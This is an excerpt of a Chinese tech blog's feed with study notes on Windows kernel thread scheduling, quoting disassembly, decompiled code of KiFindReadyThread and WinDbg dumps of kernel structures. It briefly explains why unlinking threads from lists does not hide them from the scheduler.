esi</span><br><span class="line">.text:00459562 C6 46 68 02                             mov     byte ptr [esi+68h], 2</span><br><span class="line">.text:00459566 80 A3 53 1A 00 00 00                    and     byte ptr [ebx+1A53h], 0</span><br><span class="line">.text:0045956D 83 A3 3C 1A 00 00 00                    and     dword ptr [ebx+1A3Ch], 0</span><br><span class="line">.text:00459574</span><br><span class="line">.text:00459574                         loc_459574:                             ; CODE XREF: KiIdleLoop()+109↓j</span><br><span class="line">.text:00459574 B9 01 00 00 00                          mov     ecx, 1</span><br><span class="line">.text:00459579 E8 D2 F9 FF FF                          call    _SwapContext@0  ; SwapContext()</span><br><span class="line">.text:0045957E E9 3A FF FF FF                          jmp     loc_4594BD</span><br></pre></td></tr></table></figure><h2 id="KiFindReadyThread"><a href="#KiFindReadyThread" class="headerlink" title="KiFindReadyThread"></a>KiFindReadyThread</h2><p>该函数用于寻找一个就绪态的线程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">_KTHREAD *__userpurge KiFindReadyThread@&lt;eax&gt;(<span class="type">unsigned</span> <span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2, _KPRCB *PrcbData)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">    _LIST_ENTRY *v5; <span class="comment">// edi</span></span><br><span class="line">    _LIST_ENTRY *Flink; <span class="comment">// ecx</span></span><br><span class="line">    _KTHREAD *thread; <span class="comment">// eax</span></span><br><span class="line">    _LIST_ENTRY *v8; <span class="comment">// edx</span></span><br><span class="line">    _LIST_ENTRY *Blink; <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        _BitScanReverse(&amp;v4, a1);</span><br><span class="line">        a1 ^= KiMask32Array[v4];</span><br><span class="line">        v5 = &amp;PrcbData-&gt;DispatcherReadyListHead[v4];</span><br><span class="line">        Flink = v5-&gt;Flink;</span><br><span class="line">        v10 = v4;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            thread = (_KTHREAD *)&amp;Flink[<span class="number">-15</span>].Blink;</span><br><span class="line">            <span class="keyword">if</span> ( *(_WORD *)(a2 + <span class="number">0x3C6</span>) == <span class="built_in">LOWORD</span>(Flink[<span class="number">28</span>].Blink) &amp;&amp; (*(_DWORD *)(a2 + <span class="number">0x3C8</span>) &amp; (<span class="type">int</span>)Flink[<span class="number">28</span>].Flink) != <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = Flink-&gt;Flink;</span><br><span class="line">                Blink = Flink-&gt;Blink;</span><br><span class="line">                Blink-&gt;Flink = v8;</span><br><span class="line">                v8-&gt;Blink = Blink;</span><br><span class="line">                <span class="keyword">if</span> ( v8 == Blink )</span><br><span class="line">                    PrcbData-&gt;ReadySummary ^= KiMask32Array[v10];</span><br><span class="line">                thread-&gt;NextProcessor = *(_DWORD *)(a2 + <span class="number">0x3CC</span>);</span><br><span class="line">                <span class="keyword">return</span> thread;</span><br><span class="line">            &#125;</span><br><span class="line">            Flink = Flink-&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( Flink != v5 );</span><br><span class="line">        <span class="keyword">if</span> ( a1 )</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接用一个 x86 指令 <code>bsr</code> 找到，比我想得还简单（不过据说早期的确是使用二分算法找到的），关于该指令描述如下：</p><blockquote><p>Searches the source operand (second operand) for the most significant set bit (1 bit). If a most significant 1 bit is found, its bit index is stored in the destination operand (first operand). The source operand can be a register or a memory location; the destination operand is a register. The bit index is an unsigned offset from bit 0 of the source operand. If the content source operand is 0, the content of the destination operand is undefined.<br>在源操作数（第二个操作数）中搜索最高有效设置位 （1 位）。如果找到最高有效 1 位，则其位索引将存储在目标操作数（第一个操作数）中。源操作数可以是 register 或内存位置；目标操作数是一个 register。位索引是源操作数位 0 的无符号偏移量。如果内容源操作数为 0，则目标操作数的内容未定义。</p></blockquote><p>剩余的内容，其中 <code>Flink[-15].Blink</code> 等同于 <code>Flink-0x74</code> 也就是得到 <code>_KTHREAD/_ETHREAD</code> 指针，而 <code>Flink[28].Blink</code> 和 <code>Flink[28].Flink</code> 又分别表示了 <code>EHTREAD.Affinity</code> 和 <code>ETHREAD.Process</code>。</p><p>这里无非就是判断一下当前线程能否由当前的处理器去跑，判断成功后断链该线程返回，返回之前判断一下链表是否为空，如果为空那么给对应的 <code>ReadySummary</code> 位置 <code>0</code>。</p><p>分析一遍线程切换感觉收获挺多的，突然理解了以前各种不理解的东西，后续还会继续分析线程切换相关的函数，尽量保证分析透彻，个人浅薄的见解难免有误，进请见谅。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15787751.html">https://www.cnblogs.com/wingsummer/p/15787751.html</a></li></ul>]]></content>
    
    
    <summary type="html">深入研究一下线程调度，由于篇幅较多，分章节分析</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——调度实现的学习</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsProcess3/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsProcess3/</id>
    <published>2025-01-24T14:00:00.000Z</published>
    <updated>2025-01-24T14:17:49.344Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下 Windows 线程调度的实现</p><span id="more"></span><p><code>Windows</code>中有一个函数<code>SwapContext</code>用来实现线程切换，我们先得了解一下什么情况下会引发线程切换。</p><h2 id="线程切换途径"><a href="#线程切换途径" class="headerlink" title="线程切换途径"></a>线程切换途径</h2><p>分<strong>主动切换</strong>和<strong>被动切换</strong>，很好理解，主动切换就是线程<strong>主动</strong>让出 CPU 执行，被动就是被打断而<strong>不得不</strong>让出 CPU。</p><p>在做实验的时候，多核真的是很困扰的一个问题，想了半天想不明白多核怎么工作的，为了好理解线程切换，建议虚拟机都换成单核的，线程大多数时候是主动切换的。</p><h3 id="主动切换"><a href="#主动切换" class="headerlink" title="主动切换"></a>主动切换</h3><p>ida 找到 <code>KeWaitForSingleObject</code> 函数，交叉引用</p><img src="/2025/01/24/WindowsProcess3/1.png" class=""><p>可以看到大量的 API 都有调用这个函数，而该函数必定会引发线程的切换。</p><p>调用链如下：</p><p><code>KeWaitForSingleObject-&gt;KiSwapThread-&gt;KiSwapContext-&gt;SwapContext</code></p><p>所以只要线程调用了相关的一些 api，那么就会主动让出 CPU。</p><h3 id="被动切换"><a href="#被动切换" class="headerlink" title="被动切换"></a>被动切换</h3><p>考虑这样一个情况：线程从不主动让出 CPU，而是死循环执行简单的指令，那么谁来打断它呢，此时 CPU 已经被线程独占了。之前有学过 CPU 中断执行的方法，一种是中断，一种是异常。异常是 CPU 主动触发的，所以能打断的方法似乎只有中断了。</p><h4 id="时钟中断"><a href="#时钟中断" class="headerlink" title="时钟中断"></a>时钟中断</h4><p>绝大部分系统内核函数都会调用<code>SwapContext</code>函数，来实现线程的切换，那么这种切换是线程主动调用的。那如果当前的线程不去调用系统<code>API</code>，操作系统如何实现线程切换呢?那就靠时钟中断了，这个是被动切换。</p><p>我们可以通过中断和异常来实现中断一个正在执行的程序。其中，时钟中断也是一种中断，中断号<code>0x30</code>，<code>Windows</code>系列操作系统为10-20毫秒。如下示意图就是对时钟中断执行时的流程示意图以供了解：</p><img src="/2025/01/24/WindowsProcess3/2.png" class=""><p>也就是说，即使你试图独占 CPU，那么再占用最多 20ms 后也会被迫交还 CPU 的控制权，除非屏蔽了中断。</p><h4 id="时间片管理"><a href="#时间片管理" class="headerlink" title="时间片管理"></a>时间片管理</h4><p>时钟中断会导致线程进行切换，但并不是说只要有时钟中断就一定会切换线程，时钟中断时，如下两种情况会导致线程切换：</p><ul><li>当前的线程<code>CPU</code>时间片到期</li><li>有备用线程：<code>KPCR.PrcbData.NextThread</code></li></ul><p>加上线程主动调用 api 切换线程，Windows 总共就有三种切换线程的方式。</p><h3 id="TSS"><a href="#TSS" class="headerlink" title="TSS"></a>TSS</h3><p>任务段寄存器，作为 Intel 被设计用于线程切换的结构，虽然 Intel 提供的线程切换方式没有被使用，但是实际操作系统切换的时候还是使用到了这个结构。</p><h3 id="FS"><a href="#FS" class="headerlink" title="FS"></a>FS</h3><p>在 R0，它指向了 KPCR 结构，在 R3，它指向了 TEB。</p><h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><p>线程优先级 <code>0~31</code>，其中 <code>0~15</code> 是用户线程可以达到的级别 <code>16~31</code> 是内核线程可以达到的级别。</p><p>调度会按照优先级来判断，但是每次都判断链表表头是否为空太浪费时间，因此，当一个优先级的链表中不存在线程，那就把一个变量的对应位赋值为 0，这个变量是 <code>KPCR.PrcbData.ReadySummary</code>。</p><img src="/2025/01/24/WindowsProcess3/3.png" class=""><p>在 windbg 当中，因为中断挂起了所有线程，所以调度链表中没有线程，该值为 0。</p><p>假设 <code>ReadySummary=11</code>，那么说明优先级为 <code>0 1 3</code> 的调度链表中存在线程，其余不存在，那么就可以快速地先调度优先级为 3 的线程而不用每次都从最高优先级的链表开始一个一个找到底有没有线程。</p><p>对于一个这样的 bitmap，是有算法可以快速找到这个最高优先级的线程的。</p><p>下面是我自己想的一些方法：</p><ol><li>二分法：对于这样的数据，先判断是否大于等于 32768，如果是，那么最高优先级的非空调度链表至少为 15，否则低于15，同理可得做四次运算即可获得该值。</li><li>算术法：因为打过 acm，对一个算法有印象，就是获取最低有效位，<code>int lowbit(x)&#123;return x&amp;(-x)&#125;</code>，所以我想获取最高有效位应该也有一个合适的算法，只是我目前不知道，也没有去考究。</li></ol><p>说这个是担心想到了我最开始的想法——按从大到小的顺序判断找到第一个满足 <code>((1&lt;&lt;i)&amp;ReadySummary)!=0</code> 的链表下标。事实上就算这样，它依然比一个一个搜链表快。因为这样循环 32 次，值都可以在寄存器计算得到，而搜链表则需要最多 32 次的访存。</p><p>在多 CPU 的系统中，可以指定线程绑定某个 CPU 执行，使用 API：<code>SetThreadAffinityMask</code>，<code>Affinity</code> 在介绍 <code>ETHREAD</code> 结构时讲解过这个字段。</p><p>如果没有就绪线程，CPU也不会闲下来，它会执行一个空线程即为<code>IdleThread</code>，在 KPCR 中可以找到这个成员。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15787751.html">https://www.cnblogs.com/wingsummer/p/15787751.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下 Windows 线程调度的实现</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——调度相关结构学习</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsProcess2/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsProcess2/</id>
    <published>2025-01-24T08:00:00.000Z</published>
    <updated>2025-01-24T08:54:27.279Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下调度相关的结构</p><span id="more"></span><p>很早就听说过断链隐藏的操作，因为 Windows 都是使用链表去管理进程，线程等结构的，所以断链可以达到隐藏自身的目的。那么这里就引申出来一个问题，为什么断链可以隐身且不破坏大部分的功能呢，下面的线程调度会给出答案。</p><h2 id="线程调度"><a href="#线程调度" class="headerlink" title="线程调度"></a>线程调度</h2><p>操作系统的一些理论，线程有三种状态：就绪（ready）、等待（wait）、运行（running）。</p><p>至于为什么进程&#x2F;线程断链可以达到隐藏且继续执行的目的，这里先给出答案：</p><ul><li>因为 CPU 调度&#x2F;执行时基于线程的，所以进程断链只会影响获取进程的 API 获取的结果而不会影响 CPU 调度。</li><li>因为 CPU 调度使用的和线程断链的链表不是同一个链表，因此线程断链也不会影响线程本身继续被 CPU 调度。</li></ul><h3 id="等待链表"><a href="#等待链表" class="headerlink" title="等待链表"></a>等待链表</h3><p>在上篇文章中讲到了线程的结构，其中有一个对象：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">+0x074</span> WaitListEntry    : _LIST_ENTRY</span><br><span class="line"><span class="number">+0x074</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>因为它们在同一位置，所以同一时刻一个线程只能属于 <code>WaitListEntry</code> 中或者 <code>SwapListEntry</code> 中，其中等待链表是双链表结构。线程调用了<code>Sleep</code>或者<code>WaitForSingleObject</code>等函数时，就挂到一个链表之中，它是等待链表。</p><p> 似乎 Windows7 版本开始删除了该全局变量，挂在了 KPCR 结构体下，我们可以通过以下方式找到：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dg <span class="number">0x30</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0030</span> <span class="number">80</span>b97000 <span class="number">00004</span>fff Data RW Ac <span class="number">0</span> Bg By P  Nl <span class="number">000004</span>93</span><br><span class="line"></span><br><span class="line">kd&gt; dt _KPRCB <span class="number">80</span>b97000<span class="number">+0x120</span></span><br><span class="line">ntdll!_KPRCB</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="number">+0x31e0</span> WaitListHead     : _LIST_ENTRY [ <span class="number">0x884ded7c</span> - <span class="number">0x86934dbc</span> ]</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="number">+0x3220</span> DispatcherReadyListHead : [<span class="number">32</span>] _LIST_ENTRY [ <span class="number">0x868e569c</span> - <span class="number">0x868e569c</span> ]</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>先从 0x30 指示的段描述符中取得 KPCR 的结构体地址，然后输出它的 data 字段，可以看到 <code>WaitListHead</code> 链表和 <code>DispatcherReadyListHead</code> 的 32 个链表。</p><p>这里验证一下，如果线程挂在 WaitListHead 中，那么线程状态应该是 <code>waiting</code> 状态的，观察 <code>KTHREAD</code> 字段说明，可以得到。</p><table><thead><tr><th>值</th><th>状态</th><th>描述</th></tr></thead><tbody><tr><td>0x00</td><td><strong>Initialized</strong></td><td>线程已初始化，但尚未开始运行。</td></tr><tr><td>0x01</td><td><strong>Ready</strong></td><td>线程处于就绪状态，可以被调度器分配给处理器执行。</td></tr><tr><td>0x02</td><td><strong>Running</strong></td><td>线程正在处理器上运行。</td></tr><tr><td>0x03</td><td><strong>Standby</strong></td><td>线程已被选择为下一个执行的线程，等待处理器空闲。</td></tr><tr><td>0x04</td><td><strong>Terminated</strong></td><td>线程已终止，正在清理资源。</td></tr><tr><td>0x05</td><td><strong>Waiting</strong></td><td>线程正在等待某个事件或资源（如 I&#x2F;O、同步对象）。</td></tr><tr><td>0x06</td><td><strong>Transition</strong></td><td>线程处于等待状态，但缺少必要的资源（例如尚未加载到内存的线程堆栈）。</td></tr><tr><td>0x07</td><td><strong>DeferredReady</strong></td><td>线程曾处于等待状态，现在已准备好执行，但调度尚未发生。</td></tr><tr><td>0x08</td><td><strong>GateWaitObsolete</strong></td><td>该状态已过时，仅用于向后兼容旧版 Windows。</td></tr></tbody></table><p>那么理论上来说，上面的线程 <code>State</code> 字段取值应该为 5。</p><p>取得 Flink 上的值 <code>0x884ded7c</code>，因为该字段在 <code>KTHREAD+0x74</code> 中，而指针一般都指向对应的链表字段，所以需要将地址 -0x74，下面给出输出的部分数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD <span class="number">884</span>ded7c<span class="number">-0x74</span></span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   <span class="number">+0x028</span> InitialStack     : <span class="number">0x80fb2ed0</span> Void</span><br><span class="line">   <span class="number">+0x02c</span> StackLimit       : <span class="number">0x80fb0000</span> Void</span><br><span class="line">   <span class="number">+0x030</span> KernelStack      : <span class="number">0x80fb2a60</span> Void</span><br><span class="line">   <span class="number">+0x034</span> ThreadLock       : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x038</span> WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   <span class="number">+0x039</span> Running          : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x03a Alerted          : [2]  &quot;&quot;</span></span><br><span class="line"><span class="string">   +0x03c Alertable        : 0y1</span></span><br><span class="line"><span class="string">   +0x057 Priority         : 12 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x058</span> NextProcessor    : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x05c</span> DeferredProcessor : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x060</span> ApcQueueLock     : <span class="number">0</span></span><br><span class="line">   <span class="number">+0x064</span> ContextSwitches  : <span class="number">4</span></span><br><span class="line">   <span class="number">+0x068</span> State            : <span class="number">0x5</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x069 NpxState         : 0 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x06a</span> WaitIrql         : <span class="number">0</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">   +0x06b WaitMode         : 1 &#x27;</span>&#x27;</span><br><span class="line">   <span class="number">+0x06c</span> WaitStatus       : <span class="number">0</span>n0</span><br><span class="line">   <span class="number">+0x070</span> WaitBlockList    : <span class="number">0x884dedc8</span> _KWAIT_BLOCK</span><br><span class="line">   <span class="number">+0x074</span> WaitListEntry    : _LIST_ENTRY [ <span class="number">0x883ac92c</span> - <span class="number">0x80b9a300</span> ]</span><br><span class="line">   <span class="number">+0x074</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>可以看到对应上了基本，线程优先级 12，线程状态 5（Waiting）。</p><h3 id="调度链表"><a href="#调度链表" class="headerlink" title="调度链表"></a>调度链表</h3><p>调度链表有 32 个圈，就是优先级是 <code>0-31</code>，0为最低优先级，31 为最高，默认优先级一般是 8。改变优先级就是从一个圈里面卸下来挂到另外一个圈上，这 32 个圈是正在调度中的线程，包括准备运行的线程（Ready）。比如：只有一个 <code>CPU</code> 但有10 个线程在运行，那么某一时刻，正在运行的线程在 <code>KPCR</code> 的 <code>data</code> 中，其他 9 个在这 32 个圈中。</p><p>调度链表不包括正在运行的线程这一点是可以肯定的，可以做如下实验：</p><ol><li>找到 KPCR 的 CurrentThread，查看对应的优先级</li><li>从根据优先级找到对应的调度链表，发现对应优先级的链表为空。</li></ol><img src="/2025/01/24/WindowsProcess2/1.png" class=""><p>然后查看对应的调度链表</p><img src="/2025/01/24/WindowsProcess2/2.png" class=""><p>发现为空，可以说明，正在运行的线程不会出现在调度链表中，而是直接挂在 KPCR 的 <code>CurrentThread</code> 字段。</p><hr><p>通过学习这两个结构，也可以得出一个结论了：</p><p>线程调度是基于线程，也依赖等待链表和调度链表的，不管如何断链隐藏，遍历这两个链表一定能遍历得到真实的所有线程。如果尝试把线程从这两个链表断开，那么这个线程就永远不会被调度，也就永远跑不起来了，这背离了我们隐藏线程的初衷。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15787751.html">https://www.cnblogs.com/wingsummer/p/15787751.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下调度相关的结构</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows进程与线程学习——基本结构</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsProcess1/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsProcess1/</id>
    <published>2025-01-24T06:00:00.000Z</published>
    <updated>2025-01-24T06:30:25.188Z</updated>
    
    <content type="html"><![CDATA[<p>来学习一下进程与线程的结构</p><span id="more"></span><h2 id="EPROCESS"><a href="#EPROCESS" class="headerlink" title="EPROCESS"></a>EPROCESS</h2><h3 id="定义描述"><a href="#定义描述" class="headerlink" title="定义描述"></a>定义描述</h3><p>先来看看结构体的描述</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   <span class="number">+0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   <span class="number">+0x098</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x0a0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x0a8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x0b0</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   <span class="number">+0x0b4</span> UniqueProcessId  : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0b8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x0c0</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint4B</span><br><span class="line">   <span class="number">+0x0c8</span> ProcessQuotaPeak : [<span class="number">2</span>] Uint4B</span><br><span class="line">   <span class="number">+0x0d0</span> CommitCharge     : Uint4B</span><br><span class="line">   <span class="number">+0x0d4</span> QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   <span class="number">+0x0d8</span> CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   <span class="number">+0x0dc</span> PeakVirtualSize  : Uint4B</span><br><span class="line">   <span class="number">+0x0e0</span> VirtualSize      : Uint4B</span><br><span class="line">   <span class="number">+0x0e4</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x0ec</span> DebugPort        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0f0</span> ExceptionPortData : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0f0</span> ExceptionPortValue : Uint4B</span><br><span class="line">   <span class="number">+0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   <span class="number">+0x0f8</span> Token            : _EX_FAST_REF</span><br><span class="line">   <span class="number">+0x0fc</span> WorkingSetPage   : Uint4B</span><br><span class="line">   <span class="number">+0x100</span> AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x104</span> RotateInProgress : Ptr32 _ETHREAD</span><br><span class="line">   <span class="number">+0x108</span> ForkInProgress   : Ptr32 _ETHREAD</span><br><span class="line">   <span class="number">+0x10c</span> 